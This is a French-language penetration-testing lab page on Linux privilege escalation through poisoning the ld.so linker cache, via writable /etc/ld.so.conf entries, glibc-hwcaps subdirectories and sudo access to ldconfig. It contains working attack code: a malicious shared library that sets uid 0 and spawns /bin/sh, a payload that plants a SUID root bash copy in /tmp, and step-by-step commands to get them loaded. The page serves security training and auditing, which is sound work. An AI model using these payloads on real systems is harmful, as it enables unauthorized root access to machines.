# exemple d'exploit de privesc ld.so

{{#include ../../banners/hacktricks-training.md}}

Cette page est un lab consacré au poisoning du **cache du linker système via `/etc/ld.so.conf` ou `ldconfig`**. Pour l'injection de libraries manquantes, les `RPATH`/`RUNPATH` writables, `LD_PRELOAD` et autres abus génériques du linker SUID, consultez [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Préparer l'environnement

Dans la section suivante, vous trouverez le code des fichiers que nous allons utiliser pour préparer l'environnement.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Créez** ces fichiers sur votre machine, dans le même dossier
2. **Compilez** la **library** : `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copiez** `libcustom.so` dans `/usr/lib` et actualisez le cache : `sudo cp libcustom.so /usr/lib && sudo ldconfig` (privilèges root)
4. **Compilez** l’**executable** : `gcc sharedvuln.c -o sharedvuln -lcustom`

### Vérifier l’environnement

Vérifiez que _libcustom.so_ est **chargée** depuis _/usr/lib_ et que vous pouvez **exécuter** le binaire.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Commandes de triage utiles

Lors d'une attaque contre une cible réelle, vérifiez le **nom exact de la bibliothèque** dont le binaire a besoin, ce que le **loader résout actuellement**, et quels chemins configurés sont accessibles en écriture sans modifier le cache actif.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Utilisez `ldd` uniquement sur un exécutable **trusted**. Certaines implémentations ou certains interpréteurs ELF inhabituels peuvent entraîner l'exécution de code contrôlé par un attaquant ; `objdump -p ./file | grep NEEDED` liste de manière sûre les dépendances directes. Pour une cible trusted, l'appel de l'interpréteur découvert avec `--list` affiche la résolution effective.<sup>[[4]](#references)</sup>

Quelques pièges utiles :

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` **ne fonctionne généralement pas**, car
la redirection est effectuée par votre shell actuel. Utilisez plutôt
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- Les binaires **SUID/privileged** s'exécutent en **secure-execution mode** : `LD_LIBRARY_PATH`
est ignoré, tandis que `LD_PRELOAD` est restreint (les noms contenant une barre oblique sont
ignorés, et seules les bibliothèques marquées setuid dans les répertoires standard peuvent être
préchargées). Une fois que root exécute `ldconfig`, les répertoires listés dans
`/etc/ld.so.conf` peuvent être ajoutés à `/etc/ld.so.cache`, cette mauvaise configuration peut
donc tout de même affecter les programmes privileged.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` est également ignoré en secure-execution mode, sauf si `/etc/suid-debug` existe ; récupérez donc
sa trace lors d'une exécution non-SUID équivalente au lieu d'attendre une sortie de l'exécution
privileged.<sup>[[1]](#references)</sup>
- Avec glibc 2.33 et les versions ultérieures, le dynamic loader expose également
`--list-diagnostics`, qui affiche des diagnostics lisibles par machine ainsi que les informations
sur les search paths intégrés lorsqu'un hijack ne se comporte pas comme prévu.<sup>[[1]](#references)[[6]](#references)</sup>

### Contraintes du cache et du SONAME

`ldconfig` ne met pas en cache tous les fichiers arbitraires d'un répertoire configuré : il examine les en-têtes ELF, reconnaît les noms correspondant à `lib*.so*` ou `ld-*.so*`, et attend la chaîne conventionnelle `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. L'objet injecté doit donc posséder l'architecture/classe de la cible, le nom exact de `DT_NEEDED` (normalement son `DT_SONAME`), ainsi que tous les symboles/versions que la victime résout.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Prefer a target-specific library such as this example. Shadowing a common SONAME with an incomplete object can break every process that resolves it before the intended privileged target runs.<sup>[[3]](#references)</sup>

## Exploit

Dans ce scénario, supposons qu'un administrateur ait ajouté une entrée vulnérable à un
fichier sous `/etc/ld.so.conf.d/` inclus par le
`/etc/ld.so.conf` du système.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Le dossier vulnérable est _/home/ubuntu/lib_ (auquel nous avons un accès en écriture).\
**Téléchargez et compilez** le code suivant dans ce chemin :
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Si vous vous attendez à ce que **root** (ou un autre compte privilégié) exécute ultérieurement le binaire vulnérable, il est généralement préférable de laisser un **artefact appartenant à root** plutôt que de lancer un shell interactif. Par exemple :
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Ensuite, après l'exécution avec des privilèges, vous pouvez utiliser `/tmp/rootbash -p`.

Maintenant que nous avons **créé la bibliothèque libcustom malveillante dans le** chemin mal configuré, le cache par défaut doit être reconstruit par une exécution réussie et privilégiée de **`ldconfig`**. Un redémarrage n'est utile que lorsque le processus de démarrage local l'exécute effectivement ; sinon, attendez l'intervention d'un administrateur ou utilisez une règle sudo non sécurisée, si disponible.<sup>[[2]](#references)</sup>

Une fois cette opération effectuée, **vérifiez à nouveau** depuis quel emplacement l'exécutable `sharedvuln` charge la bibliothèque `libcustom.so` :
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Comme vous pouvez le voir, il **le charge depuis `/home/ubuntu/lib`** et si un utilisateur l’exécute, un shell sera exécuté :
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Notez que dans cet exemple, nous n’avons pas élevé les privilèges, mais en modifiant les commandes exécutées et en **attendant qu’un utilisateur root ou un autre utilisateur privilégié exécute le binaire vulnérable**, nous pourrons élever les privilèges.

### Shadowing moderne de `glibc-hwcaps`

Depuis glibc 2.33, le loader peut préférer les bibliothèques optimisées situées sous `glibc-hwcaps/<level>/` dans **chaque répertoire de recherche de bibliothèques**. Par conséquent, vérifier uniquement `/home/ubuntu/lib` est insuffisant : un sous-répertoire compatible et accessible en écriture, tel que `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, peut prendre le pas sur la bibliothèque de base après que `ldconfig` l’a indexé, tandis que les autres CPU continuent d’utiliser l’objet de base. Cela fournit également un hijack sélectif selon l’architecture, qui peut passer inaperçu lorsque la validation est effectuée sur un autre CPU.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Les recommandations actuelles de hardening de glibc préconisent d’éviter les SONAMEs en double, les emplacements de recherche non par défaut et les objets dans les sous-répertoires `glibc-hwcaps`. Du point de vue de l’audit, appliquez récursivement les vérifications de propriété et d’écriture aux répertoires configurés ainsi qu’à leurs composants de chemin parent.<sup>[[3]](#references)</sup>

### Autres mauvaises configurations - Même vuln

Dans l’exemple précédent, nous avons simulé une mauvaise configuration où un administrateur **a défini un dossier non privilégié dans un fichier de configuration situé dans `/etc/ld.so.conf.d/`**.\
Mais d’autres mauvaises configurations peuvent causer la même vulnérabilité : si vous disposez de **permissions d’écriture** dans un **fichier de configuration** chargé, si vous pouvez créer un fichier dans un répertoire `/etc/ld.so.conf.d/` accessible en écriture, ou si vous pouvez écrire dans `/etc/ld.so.conf`, vous pouvez configurer et exploiter la même vulnérabilité.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Supposons que vous disposez de privilèges sudo sur `ldconfig`**.\
Vous pouvez indiquer à `ldconfig` **quel fichier de configuration lire** avec `-f`; ainsi, un fichier qui référence des répertoires contrôlés par l’attaquant peut amener `ldconfig` à ajouter ces dossiers au cache.<sup>[[2]](#references)</sup>\
Créons donc les fichiers et les dossiers nécessaires pour charger "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Maintenant, comme indiqué dans le **previous exploit**, **créez la bibliothèque malveillante dans `/tmp`**.\
Et enfin, chargeons le chemin et vérifions d’où le binaire charge la bibliothèque :
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Comme vous pouvez le constater, en disposant de privilèges sudo sur `ldconfig`, vous pouvez exploiter la même vulnérabilité.** Les détails des options sont importants lors de l’évaluation d’une règle sudo restreinte : `-f` sélectionne une autre configuration, mais reconstruit tout de même `/etc/ld.so.cache` ; `-C` redirige le cache ailleurs ; `-N` empêche la reconstruction du cache ; et `-X` empêche les mises à jour des liens, mais **reconstruit tout de même le cache, sauf s’il est combiné avec `-N`**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - page du manuel Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - page du manuel Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Renforcement de l’éditeur de liens dynamique - La GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - page du manuel Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (utilitaires binaires GNU)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Diagnostics de l’éditeur de liens dynamique (La GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
{{#include ../../banners/hacktricks-training.md}}
